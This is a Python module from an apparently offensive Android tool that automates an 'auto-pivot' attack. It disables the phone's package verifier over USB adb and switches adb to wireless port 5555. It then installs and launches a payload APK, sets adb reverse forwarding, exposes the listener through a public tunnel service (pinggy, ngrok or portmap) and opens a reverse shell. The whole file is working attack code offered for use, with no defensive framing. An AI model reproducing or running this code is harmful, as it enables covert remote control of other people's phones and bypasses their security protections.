"""Auto-Pivot (CLI option 65): USB prime → tcpip 5555 → wireless exploit.

Flow:
  A) USB prime   — detect USB device, `adb tcpip 5555`, read Wi-Fi IP
  B) PIVOT       — prompt user to unplug cable (stay on Wi-Fi), `adb connect`
  C) Payload     — FGS payload (LHOST=127.0.0.1) → install → launch
  D) Channel     — adb reverse (WORKS over wireless adb; port-switch friendly)
  E) Tunnel      — pinggy/ngrok/portmap public port (phone untouched)
  F) Shell       — pure-Python listener, no Metasploit

Every phase is wrapped so the Andro-DLS CLI never crashes — on any failure
we print a friendly message and return to the main menu.
"""
from __future__ import annotations

import socket
import subprocess
import time

from modules import remoteshell
from modules.config import AppConfig
from modules.console import (
    console,
    print_error,
    print_success,
    print_warning,
    ask,
)

LPORT = remoteshell.LPORT
PKG = remoteshell.PKG


def _adb_wireless_connect(ip: str, timeout: int = 40) -> str | None:
    """Loop `adb connect ip:5555` until connected (or timeout)."""
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            r = subprocess.run(
                ["adb", "connect", f"{ip}:5555"], capture_output=True, text=True
            )
            if "connected" in r.stdout.lower():
                ok_wire = f"{ip}:5555"
                print_success(f"wireless adb up: {ok_wire}")
                return ok_wire
        except Exception:
            pass
        time.sleep(2)
    print_error(f"wireless connect to {ip}:5555 failed — is phone on the same Wi-Fi?")
    return None


def run(config: AppConfig, provider: str = "pinggy", use_tunnel: bool = True) -> int:
    # ---- Phase A: USB prime -------------------------------------------------
    console.print("\n[bold cyan]▸ AUTO-PIVOT[/bold cyan]  USB prime → wireless exploit\n")
    print("[cyan]Phase A[/cyan] — connect the phone via USB cable and accept the popup…")

    serial = None
    # give the user a short moment to plug in; then bail with clear guidance
    for _ in range(8):
        serial = remoteshell.first_device(allowed_wifi=False)
        if serial:
            break
        time.sleep(2)
    if not serial:
        print_error("no USB device detected — plug the cable, accept the popup, then choose 65 again")
        return 1
    print_success(f"USB device: {serial}")

    try:
        subprocess.run(["adb", "-s", serial, "shell", "settings", "put",
                        "global", "package_verifier_enable", "0"],
                       capture_output=True, text=True)
        subprocess.run(["adb", "-s", serial, "tcpip", "5555"],
                       capture_output=True, text=True)
        time.sleep(2)
        ip = remoteshell.read_wifi_ip(serial)
    except Exception as e:
        print_error(f"USB prime failed: {e}")
        return 1
    if not ip:
        print_error("could not read device Wi-Fi IP over USB")
        return 1
    print_success(f"device Wi-Fi IP: {ip}")

    # ---- Phase B: PIVOT -----------------------------------------------------
    console.print(
        "\n[yellow]Phase B — PIVOT[/yellow]\n"
        "  >>> [bold]UNPLUG the USB cable now[/bold], keep the phone on Wi-Fi,\n"
        "      then press Enter to switch to wireless <<<"
    )
    try:
        ask("")
    except (KeyboardInterrupt, EOFError):
        print("\n[dim]cancelled[/dim]")
        return 1

    wire = _adb_wireless_connect(ip)
    if not wire:
        return 1

    # ---- Phase C: payload ---------------------------------------------------
    print("[cyan]Phase C[/cyan] — building FGS payload (LHOST=127.0.0.1)…")
    apk = remoteshell.build_fgs_payload("127.0.0.1", LPORT)
    if not apk:
        return 1
    if not remoteshell.install_and_launch(wire, apk):
        return 1

    # ---- Phase D: channel (reverse works over wireless adb) -----------------
    print("[cyan]Phase D[/cyan] — channel…")
    remoteshell.set_reverse(wire, LPORT)

    # ---- Phase E: tunnel ----------------------------------------------------
    tun = None
    if use_tunnel:
        print("[cyan]Phase E[/cyan] — tunnel…")
        tun = remoteshell.open_tunnel(provider)

    console.print(
        "\n[bold cyan]▓▓ AUTO-PIVOT READY ▓▓[/bold cyan]\n"
        f"  wireless serial : {wire}\n"
        f"  listener        : 127.0.0.1:{LPORT}\n"
        + (f"  public          : {tun.endpoint}\n" if tun else "")
        + "\n[dim]device dials 127.0.0.1 — public port can switch freely, phone untouched[/dim]\n"
    )

    # ---- Phase F: shell -----------------------------------------------------
    try:
        remoteshell.run_shell(timeout=120)
    except Exception as e:
        print_warning(f"shell issue: {e}")

    if tun:
        remoteshell.stop_tunnel(tun)
    print_warning("\npivot session closed — back to menu")
    return 0
